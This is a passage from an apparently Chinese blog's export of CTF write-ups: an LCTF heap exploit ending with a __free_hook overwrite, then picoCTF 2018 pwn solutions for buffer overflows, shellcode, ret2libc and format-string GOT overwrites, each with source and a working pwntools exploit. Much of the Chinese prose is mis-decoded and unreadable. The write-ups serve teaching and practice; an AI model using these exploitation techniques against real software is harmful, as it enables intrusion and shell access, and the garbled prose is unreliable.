0x556bf9a1ec20: 0x0000000000000000 0x0000000000000000 0x556bf9a1ec30: 0x0000000000000000 0x0000000000000000 è¿™æ—¶æˆ‘ä»¬å¯ä»¥çœ‹åˆ°chunk9çš„pre_sizeä½ä½0x200chunk9çš„previnuseä½ä¹Ÿä¸º0ï¼Œå°±å¯ä»¥å°è¯•ä¸€æ³¢unlinkäº†ï¼Œå…ˆæŠŠtcacheå¡«æ»¡ï¼Œå†free9åï¼Œæˆ‘ä»¬å†çœ‹ä¸‹chunk pwndbg&gt; parseheap addr prev size status fd bk 0x5624364b4000 0x0 0x250 Used None None 0x5624364b4250 0x0 0xb0 Used None None 0x5624364b4300 0x0 0x100 Used None None 0x5624364b4400 0x0 0x100 Used None None 0x5624364b4500 0x0 0x100 Used None None 0x5624364b4600 0x0 0x100 Used None None 0x5624364b4700 0x0 0x100 Used None None 0x5624364b4800 0x0 0x100 Used None None 0x5624364b4900 0x0 0x100 Used None None æˆ‘ä»¬æ¥ç€æŠŠtcacheæ¸…ç©ºï¼Œæ–°å»ºchunk9å’Œoverwriteåˆ°chunk8çš„chunk7ï¼Œå†æŠŠchunk6å’Œchunk9é‡Šæ”¾æ‰åï¼Œè¿™æ—¶chunk7é‡Œå­˜çš„å°±æ˜¯heapåœ°å€äº†ï¼Œshow(7)ä¾¿å¯ä»¥æ³„éœ²heapbase pwndbg&gt; parseheap addr prev size status fd bk 0x55fe2fe46000 0x0 0x250 Used None None 0x55fe2fe46250 0x0 0xb0 Used None None 0x55fe2fe46300 0x0 0x100 Used None None 0x55fe2fe46400 0x0 0x100 Used None None 0x55fe2fe46500 0x0 0x100 Used None None 0x55fe2fe46600 0x0 0x100 Used None None 0x55fe2fe46700 0x0 0x100 Used None None 0x55fe2fe46800 0x0 0x100 Used None None 0x55fe2fe46900 0x0 0x100 Used None None 0x55fe2fe46a00 0x0 0x100 Used None None 0x55fe2fe46b00 0x100 0x100 Used None None pwndbg&gt; x/8x 0x55fe2fe46b00 0x55fe2fe46b00: 0x0000000000000100 0x0000000000000101 0x55fe2fe46b10: 0x000055fe2fe46310 &lt;== 0x0000000000000000 0x55fe2fe46b20: 0x0000000000000000 0x0000000000000000 0x55fe2fe46b30: 0x0000000000000000 0x0000000000000000 ä¹‹åå°±æ˜¯æƒ³åŠæ³•å»æ³„éœ²libcåœ°å€äº†ï¼Œè¿™æ­¥ä¹Ÿå¡äº†å¾ˆä¹…ï¼Œæœ¬æ¥æ˜¯æƒ³é€šè¿‡tcache_dupä¿®æ”¹chunk7é‡Œçš„æ•°æ®æ”¹æˆé‚£ä¸ªå­˜ç€libcåœ°å€çš„åœ°å€ï¼Œåæ¥å‘ç°çœŸçš„è¢«è‡ªå·±è ¢å“­ï¼Œæœ€åæˆ‘æ˜¯æŠŠchunk_menuä¹Ÿå°±æ˜¯ä¸€å¼€å§‹callocçš„0xb0çš„chunké‡Œé¢chunk7çš„æŒ‡é’ˆé€šè¿‡tcache_dupæ”¹æˆå­˜ç€libcåœ°å€çš„chunkå†leakå‡ºæ¥ pwndbg&gt; heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 (0x90) fastbin[7]: 0x0 (0xa0) fastbin[8]: 0x0 (0xb0) fastbin[9]: 0x0 top: 0x565551ed3c00 (size : 0x20400) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0 (0x100) tcache_entry[14]:0x565551ed3b10 --&gt; 0x565551ed3b10 (overlap chunk with 0x565551ed3b00(freed) ) pwndbg&gt; parseheap addr prev size status fd bk 0x565551ed3000 0x0 0x250 Used None None 0x565551ed3250 0x0 0xb0 Used None None 0x565551ed3300 0x0 0x100 Used None None 0x565551ed3400 0x0 0x100 Used None None 0x565551ed3500 0x0 0x100 Used None None 0x565551ed3600 0x0 0x100 Used None None 0x565551ed3700 0x0 0x100 Used None None 0x565551ed3800 0x0 0x100 Used None None 0x565551ed3900 0x0 0x100 Used None None 0x565551ed3a00 0x0 0x100 Used None None 0x565551ed3b00 0x100 0x100 Used None None pwndbg&gt; åœ¨æ³„éœ²å‡ºäº†libcåœ°å€ååŸºæœ¬å°±æ˜¯ä¸ºæ‰€æ¬²ä¸ºäº†ï¼Œé‡æ–°åšä¸ªtcache_dupæŠŠfree_hookä¿®æ”¹æˆone_gadgetå°±ç›´æ¥getshelläº†ï¼Œè¿™é‡Œè´´ä¸Šexp from pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;./easy_heap&#39;) #n = remote(&#39;118.25.150.134&#39;,6666) elf = ELF(&#39;./easy_heap&#39;) libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;) def new_0(): n.recvuntil(&#39;which command?\\n&gt; &#39;) n.sendline(&quot;1&quot;) n.recvuntil(&#39;&gt; &#39;) n.sendline(&#39;0&#39;) def new(size,content): n.recvuntil(&#39;which command?\\n&gt; &#39;) n.sendline(&quot;1&quot;) n.recvuntil(&#39;size \\n&gt; &#39;) n.sendline(str(size)) n.recvuntil(&#39;content \\n&gt; &#39;) n.sendline(content) def free(idx): n.recvuntil(&#39;which command?\\n&gt; &#39;) n.sendline(&quot;2&quot;) n.recvuntil(&#39;index \\n&gt; &#39;) n.sendline(str(idx)) def show(idx): n.recvuntil(&#39;which command?\\n&gt; &#39;) n.sendline(&quot;3&quot;) n.recvuntil(&#39;index \\n&gt; &#39;) n.sendline(str(idx)) def new_tcache(): for i in range(7): new(0x10,&#39;aaaa&#39;) def free_tcache(): for i in range(0,7): free(i) new_tcache() new(0x10,&#39;aaaa&#39;) #7 new(0x10,&#39;bbbb&#39;) #8 new(0x10,&#39;cccc&#39;) #9 free_tcache() free(7) free(8) free(9) new_tcache() new(0x10,&#39;aaaa&#39;) #7 new(0x10,&#39;bbbb&#39;) #8 new(0x10,&#39;cccc&#39;) #9 free_tcache() free(7) new_tcache() free(8) new(0xf8,&#39;overwrite 9&#39;) free_tcache() free(9) new_tcache() new(0x10,&#39;aaaa&#39;) #9 new(0x10,&#39;bbbb&#39;) #7(8) free(6) free(9) show(7) heap_base = u64(n.recv(6)+&#39;\\x00\\x00&#39;) print hex(heap_base) free(7) new(0xf0,p64(heap_base-64)) #7 new(0xf0,&#39;aaaa&#39;) #7_2 new(0xf0,p64(heap_base+0x700+0x8)) show(7) libc_base = u64(n.recv(6)+&#39;\\x00\\x00&#39;) - 0x3ebca0 print hex(libc_base) free_hook = libc.symbols[&#39;__free_hook&#39;]+libc_base print &quot;free_hook&quot;,hex(free_hook) one_gadget = libc_base + 0x4f322 free(6) free(9) new(0xf0,p64(free_hook)) new(0xf0,&#39;aaaa&#39;) new(0xf0,p64(one_gadget)) n.interactive() æ€»ç»“è¿™æ¬¡LCTFå­¦åˆ°äº†ä¸å°‘ï¼Œæ„Ÿè°¢ä¸ä½¬æ²¡æ‰“æ­»æˆ‘è¿˜å‘Šè¯‰æˆ‘è°ƒè¯•å¾—å‡ºæ¥putså‡ºæ¥çš„æ˜¯é‡Œé¢çš„å€¼é‡Œé¢ä¸æ˜¯æŒ‡é’ˆï¼Œä¸‹æ¬¡ä¸€å®šè¦å¥½å¥½å­¦ä¹ è·Ÿä¸Šå¤§å“¥ä»¬çš„è§£é¢˜é€Ÿåº¦","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"picoCTFã®pwnè§£æ","slug":"picoCTFã®pwnè§£æ","date":"2019-11-05T03:50:36.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2019/11/05/picoCTFã®pwnè§£æ/","link":"","permalink":"/2019/11/05/picoCTFã®pwnè§£æ/","excerpt":"","text":"å›½åº†æœŸé—´å¾—çŸ¥äº†ç¾å›½CMUä¸»åŠçš„picoCTFæ¯”èµ›ï¼Œå‡ºäºæœ€è¿‘åšé¢˜çš„æ‰‹æ„Ÿæœ‰æ‰€ä¸‹é™ï¼Œå€Ÿæ­¤æ¯”èµ›æ¥å¤ä¹ ä¸‹PWNç›¸å…³çš„é¢˜å‹ï¼ˆé¢˜ç›®çš„è´¨é‡ä¸é”™ï¼Œè€Œä¸”é¢˜å‹å¾ˆå¹¿ï¼Œè‡ªæˆ‘æ„Ÿè§‰ç›¸å½“æ£’çš„æ¯”èµ›ï¼‰ æœ¬æ–‡é¦–å‘äºå®‰å…¨å®¢â€”picoCTFã®pwnè§£æ buffer overflow 0å…ˆæ£€æŸ¥ä¸€éæ–‡ä»¶ âœ bufferoverflow0 file vuln vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e1e24cdf757acbd04d095e531a40d044abed7e82, not stripped âœ bufferoverflow0 checksec vuln [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/bufferoverflow0/vuln&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ç”±äºè¿™é¢˜ç»™äº†æºç æ‰€ä»¥æˆ‘ä»¬ç›´æ¥çœ‹æºç  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;signal.h&gt; #define FLAGSIZE_MAX 64 char flag[FLAGSIZE_MAX]; void sigsegv_handler(int sig) { fprintf(stderr, &quot;%s\\n&quot;, flag); fflush(stderr); exit(1); } void vuln(char *input){ char buf[16]; strcpy(buf, input);// !stackoverflow } int main(int argc, char **argv){ FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;); if (f == NULL) { printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\\n&quot;); exit(0); } fgets(flag,FLAGSIZE_MAX,f); signal(SIGSEGV, sigsegv_handler); gid_t gid = getegid(); setresgid(gid, gid, gid); if (argc &gt; 1) { vuln(argv[1]); printf(&quot;Thanks! Received: %s&quot;, argv[1]); } else printf(&quot;This program takes 1 argument.\\n&quot;); return 0; } ä¸éš¾çœ‹å‡ºä¼ å…¥çš„å‚æ•°æ²¡æœ‰é™åˆ¶å¤§å°é€ æˆåœ¨vulnå‡½æ•°é‡Œé¢strcpyè‡³bufæ—¶å¯èƒ½å¯¼è‡´æ ˆæº¢å‡ºï¼Œè€Œè¿™é¢˜åªè¦å°†ç¨‹åºæ‰§è¡ŒæµåŠ«æŒåˆ°sigsegv_handlerå‡½æ•°å°±å¯ä»¥è¯»flagï¼Œç›´æ¥æ”¾exp EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) elf = ELF(&#39;./vuln&#39;) flag_addr = 0x804a080 puts_plt = elf.plt[&#39;puts&#39;] buf = &#39;a&#39;*0x18 payload = buf + &#39;aaaa&#39; payload += p32(puts_plt) + &#39;aaaa&#39; + p32(flag_addr) n = process(argv=[&#39;./vuln&#39;, payload]) n.interactive() FLAG picoCTF{ov3rfl0ws_ar3nt_that_bad_a54b012c} buffer overflow 1æ£€æŸ¥ä¸€éæ–‡ä»¶ âœ bufferoverflow1 file vuln vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=98eac1e5bfaa95437b28e069a343f3c3a7b9e800, not stripped âœ bufferoverflow1 checksec vuln [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/bufferoverflow1/vuln&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments å…¨éƒ½æ²¡å¼€ï¼Œå¤§èƒ†çŒœæµ‹æ˜¯è¦æˆ‘ä»¬å†™shellcodeï¼Œçœ‹æºç ç¡®è®¤ä¸€æ³¢ #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; #include &quot;asm.h&quot; #define BUFSIZE 32 #define FLAGSIZE 64 void win() { char buf[FLAGSIZE]; FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;); if (f == NULL) { printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\\n&quot;); exit(0); } fgets(buf,FLAGSIZE,f); printf(buf); } void vuln(){ char buf[BUFSIZE]; gets(buf); printf(&quot;Okay, time to return... Fingers Crossed... Jumping to 0x%x\\n&quot;, get_return_address()); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); gid_t gid = getegid(); setresgid(gid, gid, gid); puts(&quot;Please enter your string: &quot;); vuln(); return 0; } emmmmâ€¦â€¦çœ‹èµ·æ¥æ˜¯å¯ä»¥ç”¨ret2shellcodeä½†æ„Ÿè§‰æœ‰ç‚¹éº»çƒ¦ï¼Œæ‰€ä»¥å°±ç®€å•å¥—è·¯ç›´æ¥æº¢å‡ºååŠ«æŒè¿”å›åœ°å€ä¸ºwinå‡½æ•°ç›´æ¥getflag EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) n = process(&#39;./vuln&#39;) elf = ELF(&#39;./vuln&#39;) buf = 0x28 win_addr = 0x080485CB payload = &#39;a&#39;*buf + &#39;aaaa&#39; + p32(win_addr) n.sendline(payload) n.interactive() FLAG picoCTF{addr3ss3s_ar3_3asy14941911} leak-meâœ leak-me file auth auth: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c69a8024075d10a44fe028c410f5a06580bd3d82, not stripped âœ leak-me checksec auth [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/leak-me/auth&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) çœ‹æºç åˆ†æä¸€ä¸‹ç¨‹åºçš„ä¸»è¦åŠŸèƒ½ #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; int flag() { char flag[48]; FILE *file; file = fopen(&quot;flag.txt&quot;, &quot;r&quot;); if (file == NULL) { printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\\n&quot;); exit(0); } fgets(flag, sizeof(flag), file); printf(&quot;%s&quot;, flag); return 0; } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid gid_t gid = getegid(); setresgid(gid, gid, gid); // real pw: FILE *file; char password[64]; char name[256]; char password_input[64]; memset(password, 0, sizeof(password)); memset(name, 0, sizeof(name)); memset(password_input, 0, sizeof(password_input)); printf(&quot;What is your name?\\n&quot;); fgets(name, sizeof(name), stdin); char *end = strchr(name, &#39;\\n&#39;); //name=&#39;a&#39;*0x100 *end = NULL if (end != NULL) { *end = &#39;\\x00&#39;; } strcat(name, &quot;,\\nPlease Enter the Password.&quot;); file = fopen(&quot;password.txt&quot;, &quot;r&quot;); if (file == NULL) { printf(&quot;Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\\n&quot;); exit(0); } fgets(password, sizeof(password), file); printf(&quot;Hello &quot;); puts(name); fgets(password_input, sizeof(password_input), stdin); password_input[sizeof(password_input)] = &#39;\\x00&#39;; if (!strcmp(password_input, password)) { flag(); } else { printf(&quot;Incorrect Password!\\n&quot;); } return 0; } æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å­˜åœ¨ä¸€ä¸ªå¾ˆç»å…¸çš„æ …æ é”™è¯¯ç±»å‹çš„off-by-oneæ¼æ´ï¼Œå½“nameè¾“å…¥ä¸ºâ€˜aâ€™* 0x100 æ—¶æ ˆä¸Šçš„ç»“æ„ä¼šå¦‚ä¸‹å›¾æ‰€ç¤º æˆ‘ä»¬çŸ¥é“putsæ˜¯æ ¹æ®â€™\\x00â€™æ¥åˆ¤æ–­å­—ç¬¦ä¸²çš„æœ«ç«¯æ¥è¾“å‡ºï¼Œæ ¹æ®ç¨‹åºé€»è¾‘æ­£å¸¸çš„æƒ…å†µä¸‹åº”è¯¥æ˜¯åƒå·¦å›¾ä¸€æ ·æ˜¯ä»¥â€™\\nâ€™ä¸ºç»“å°¾çš„å­—ç¬¦ä¸²ï¼Œç„¶åé€šè¿‡æºä»£ç 43â€”47è¡Œæ¥å°†â€™\\nâ€™æ›¿æ¢æˆâ€™\\x00â€™ä½¿å¾—puts(name)èƒ½æ­£ç¡®è¾“å‡ºè¾“å…¥çš„nameï¼Œä½†å¦‚æœè¾“å…¥äº†â€™aâ€™* 256çš„è¯ï¼Œä¼šå¯¼è‡´æœ€åä¸€ä¸ªâ€™\\nâ€™å¹¶æ²¡æœ‰è¯»å…¥è€Œå¯¼è‡´ç¨‹åºåœ¨puts(name)æ—¶ä¼šè¿å¸¦ä¸‹é¢çš„passwordä¸€èµ·è¾“å‡ºï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°æœåŠ¡å™¨ä¸Šçš„passwordä¸º a_reAllY_s3cuRe_p4s$word_f85406 ç„¶åç›´æ¥è¿æœåŠ¡å™¨ï¼Œè¾“å…¥é•¿åº¦å°äº256çš„nameå’Œleakå‡ºæ¥çš„passwordå°±èƒ½ç›´æ¥æ‹¿åˆ°flag FLAG picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_0f7ec3c0} shellcodeâœ shellcode file vuln vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=fdba7cd36e043609da623c330a501f920470b49a, not stripped âœ shellcode checksec vuln [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/shellcode/vuln&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments emmmmâ€¦â€¦é˜²æŠ¤æœºåˆ¶å…¨æ²¡å¼€è€Œä¸”é¢˜ç›®è¿˜å«shellcodeï¼Œåº”è¯¥é”™ä¸äº†æ˜¯å†™shellcodeäº† #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; #define BUFSIZE 148 #define FLAGSIZE 128 void vuln(char *buf){ gets(buf); puts(buf); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); char buf[BUFSIZE]; puts(&quot;Enter a string!&quot;); vuln(buf); puts(&quot;Thanks! Executing now...&quot;); ((void (*)())buf)(); return 0; } ç®€å•å®¡è®¡æºç åå‘ç°è¿˜çœŸæ˜¯åªè¦å†™ä¸ªshellcodeå°±æ²¡äº†ï¼Œç›´æ¥ç»™exp EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) n = process(&#39;./vuln&#39;) elf = ELF(&#39;./vuln&#39;) payload = asm(shellcraft.sh()) n.sendline(payload) n.interactive() FLAG picoCTF{shellc0de_w00h00_7f5a7309} bufer overflow2âœ bufferoverflow2 file vuln vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f2f6cce698b62f5109de9955c0ea0ab832ea967c, not stripped âœ bufferoverflow2 checksec vuln [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/bufferoverflow2/vuln&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) å®¡è®¡ä¸€ä¸‹æºç  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; #define BUFSIZE 100 #define FLAGSIZE 64 void win(unsigned int arg1, unsigned int arg2) { char buf[FLAGSIZE]; FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;); if (f == NULL) { printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\\n&quot;); exit(0); } fgets(buf,FLAGSIZE,f); if (arg1 != 0xDEADBEEF) return; if (arg2 != 0xDEADC0DE) return; printf(buf); } void vuln(){ char buf[BUFSIZE]; gets(buf); puts(buf); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); gid_t gid = getegid(); setresgid(gid, gid, gid); puts(&quot;Please enter your string: &quot;); vuln(); return 0; } æˆ‘ä»¬å¾ˆå®¹æ˜“ç†è§£é¢˜ç›®æ˜¯è¦æˆ‘ä»¬é€šè¿‡vulnå‡½æ•°é‡Œçš„æ ˆæº¢å‡ºæŠŠæ‰§è¡ŒæµåŠ«æŒåˆ°winå‡½æ•°ï¼Œå¹¶ä¸”è¦ä½¿ä¼ å…¥çš„å‚æ•°ä¸º0xDEADBEEFå’Œ0xDEADC0DEï¼Œç”±äºæ˜¯32ä½ç¨‹åºï¼Œæ‰€ä»¥ç›´æ¥p32(0xDEADBEEF)+p32(0xDEADC0DE)æ„é€ ROPæ¥getflag EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) n = process(&#39;./vuln&#39;) elf = ELF(&#39;./vuln&#39;) buf = &#39;a&#39;*0x6c win_addr = 0x80485CB payload = buf + &#39;aaaa&#39; + p32(win_addr)+ &#39;aaaa&#39; + p32(0xDEADBEEF) + p32(0xDEADC0DE) n.sendline(payload) n.interactive() FLAG picoCTF{addr3ss3s_ar3_3asy30833fa1} got-2-learn-libcâœ got-2-learn-libc file vuln vuln: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4e901d4c8bdb0ea8cfd51522376bea63082a2734, not stripped âœ got-2-learn-libc checksec vuln [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/got-2-learn-libc/vuln&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled å¼€äº†PIEï¼Œç„¶è€Œçœ‹åˆ°ç¨‹åºè§‰å¾—å¼€æ²¡å¼€éƒ½æ²¡å·®çš„æ ·å­ #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; #define BUFSIZE 148 #define FLAGSIZE 128 char useful_string[16] = &quot;/bin/sh&quot;; /* Maybe this can be used to spawn a shell? */ void vuln(){ char buf[BUFSIZE]; puts(&quot;Enter a string:&quot;); gets(buf); puts(buf); puts(&quot;Thanks! Exiting now...&quot;); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); puts(&quot;Here are some useful addresses:\\n&quot;); printf(&quot;puts: %p\\n&quot;, puts); printf(&quot;fflush %p\\n&quot;, fflush); printf(&quot;read: %p\\n&quot;, read); printf(&quot;write: %p\\n&quot;, write); printf(&quot;useful_string: %p\\n&quot;, useful_string); printf(&quot;\\n&quot;); vuln(); return 0; } æ˜¯çš„ï¼Œå°±æ˜¯ä¸€ä¸ªç®€å•çš„ret2libcçš„åº”ç”¨ï¼Œé€šè¿‡printfå‡ºçš„åœ°å€æˆ‘ä»¬å¯ä»¥å¾—åˆ°åç§»é‡ï¼Œç„¶åå»è®¡ç®—systemçš„å®é™…åœ°å€ï¼Œç„¶åæŠŠuseful_stringè¾“å‡ºçš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯â€/bin/shâ€å½“ä½œå‚æ•°æ¥æ„é€ ROPæ¥æ‰§è¡Œsystem(â€˜/bin/shâ€™) æˆ‘ä»¬å…ˆè¿ä¸Šé¢˜ç›®ç¯å¢ƒçœ‹ä¸‹æ–‡ä»¶é“¾æ¥çš„libcæ–‡ä»¶çš„è·¯å¾„ Ep3ius@pico-2018-shell-2:/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833$ ldd * vuln: linux-gate.so.1 =&gt; (0xf77c5000) libc.so.6 =&gt; /lib32/libc.so.6 (0xf75ff000) /lib/ld-linux.so.2 (0xf77c6000) EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) n = process(&#39;./vuln&#39;) elf = ELF(&#39;./vuln&#39;) libc = ELF(&#39;/lib32/libc.so.6&#39;) buf = &#39;a&#39;*0x9c system_sym = libc.symbols[&#39;system&#39;] puts_sym = libc.symbols[&#39;puts&#39;] n.recvuntil(&#39;puts: 0x&#39;) puts_addr = int(n.recvuntil(&#39;\\n&#39;),16) print hex(puts_addr) n.recvuntil(&#39;useful_string: &#39;) sh_addr = int(n.recvuntil(&#39;\\n&#39;),16) print hex(sh_addr) system_addr = (puts_addr - puts_sym) + system_sym payload = buf + &#39;aaaa&#39; + p32(system_addr) + &#39;aaaa&#39; + p32(sh_addr) n.sendline(payload) n.interactive() echoooâœ echooo file echo echo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a5f76d1d59c0d562ca051cb171db19b5f0bd8fe7, not stripped âœ echooo checksec echo [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/echooo/echo&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); char buf[64]; char flag[64]; char *flag_ptr = flag; // Set the gid to the effective gid gid_t gid = getegid(); setresgid(gid, gid, gid); memset(buf, 0, sizeof(flag)); memset(buf, 0, sizeof(buf)); puts(&quot;Time to learn about Format Strings!&quot;); puts(&quot;We will evaluate any format string you give us with printf().&quot;); puts(&quot;See if you can get the flag!&quot;); FILE *file = fopen(&quot;flag.txt&quot;, &quot;r&quot;); if (file == NULL) { printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\\n&quot;); exit(0); } fgets(flag, sizeof(flag), file); while(1) { printf(&quot;&gt; &quot;); fgets(buf, sizeof(buf), stdin); printf(buf); } return 0; } å®¡è®¡å®Œæºç åå‘ç°åœ¨mainå‡½æ•°æœ«å°¾å­˜åœ¨å¯å¤šæ¬¡åˆ©ç”¨çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè€Œflagå·²ç»è¯»å…¥åˆ°æ ˆä¸Šæœ¬æ¥çš„è§£é¢˜æ€è·¯åº”è¯¥æ˜¯é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²è¯»æ ˆä¸Šflagæ‰€åœ¨çš„ä½ç½®æ¥è·å¾—flagï¼Œä½†æˆ‘çš„ç¬¬ä¸€æƒ³æ³•æ˜¯ç›´æ¥æ”¹printf_gotä¸ºsystemçš„å®é™…åœ°å€æ‹¿shell å…ˆæµ‹å‡ºæ¥åç§»ä¸º11 âœ echooo ./echo Time to learn about Format Strings! We will evaluate any format string you give us with printf(). See if you can get the flag! &gt; aaaa%11$x aaaa61616161 ç„¶åé€šè¿‡p32(printf_got)+â€%11$sâ€æ³„éœ²å‡ºprintfçš„å®é™…åœ°å€æ¥è®¡ç®—åç§»ä»¥æ­¤å¾—åˆ°systemçš„å®é™…åœ°å€ EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) #n = process(&#39;./echo&#39;) n = remote(&#39;2018shell2.picoctf.com&#39;,57169) elf = ELF(&#39;./echo&#39;) libc = ELF(&#39;/lib32/libc.so.6&#39;) #printf_got = elf.got[&#39;printf&#39;] printf_got = 0x804a00c printf_sym = libc.symbols[&#39;printf&#39;] system_sym = libc.symbols[&#39;system&#39;] payload = p32(printf_got)+&#39;%11$s&#39; n.recvuntil(&#39;&gt;&#39;) n.sendline(payload) #leak printf_addr1 = n.recvuntil(&#39;\\n&#39;) printf_addr = u32(printf_addr1[5:9]) print hex(printf_addr) offset = printf_addr - printf_sym system_addr = offset + system_sym print hex(system_addr) payload_fmt = fmtstr_payload(11,{printf_got:system_addr}) n.recvuntil(&#39;&gt;&#39;) n.sendline(payload_fmt) sleep(0.1) n.sendline(&#39;/bin/sh\\0&#39;) n.interactive() FLAG picoCTF{foRm4t_stRinGs_aRe_DanGer0us_e3d226b2} authenticateâœ authenticate file auth auth: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=36db9dbaf46e8f9c9055839ffedd30fe65050a47, not stripped âœ authenticate checksec auth [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/authenticate/auth&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) å®¡è®¡ä¸‹æºç  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;stdint.h&gt; #include &lt;string.h&gt; #include &lt;sys/types.h&gt; int authenticated = 0; int flag() { char flag[48]; FILE *file; file = fopen(&quot;flag.txt&quot;, 